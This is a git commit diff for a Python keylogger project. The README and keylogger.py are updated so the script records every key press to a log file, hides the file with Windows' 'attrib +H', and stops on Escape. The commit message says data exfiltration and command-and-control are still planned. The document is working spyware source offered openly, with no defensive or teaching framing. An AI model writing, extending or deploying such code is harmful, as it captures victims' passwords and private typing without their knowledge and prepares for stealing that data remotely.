f74f50ad5c44cac71a3dc74a650c649ff52df979
Fadi1089 <fadi.soltan1089@gmail.com>
2024-06-22 17:56:07 +0200

    first functional version
    this version only saves the keystrokes to a hidden log file. Data exfiltration and C2 protocols still needed

--- README.md
+++ README.md
@@ -1,3 +1,3 @@
 # Demo 2
 
-This is a simple python keylogger
+This is a simple python keylogger that captures keystrokes and saves them to a hidden log file in the Users/CURRENTUSER directory.
--- keylogger.py
+++ keylogger.py
@@ -1,18 +1,22 @@
 import keyboard
 import subprocess
 
+log = "C:/Users/fadis/.log.txt"
+
 def on_key_press(event):
     with open(log, "a") as file:
+        subprocess.run(["attrib", "+H", log], check=True)
         file.write("{}\n".format(event.name))
 
+    if event.name == "esc":
+        exit()
 
 # Creating the log file nad hiding it
-log = open("C:/Users/fadis/.log.txt", "x")
-subprocess.run(["attrib", "+H", "C:/Users/fadis/.log.txt"], check=True)
+# log = open("C:/Users/fadis/.log.txt", "x")
 
 # Writing the First line to the log file and closes it
-log.write("Beginning of logfile")
-log.close()
+# log.write("Beginning of logfile")
+# log.close()
 
 # Registering the Keystrokes
 keyboard.on_press(on_key_press)
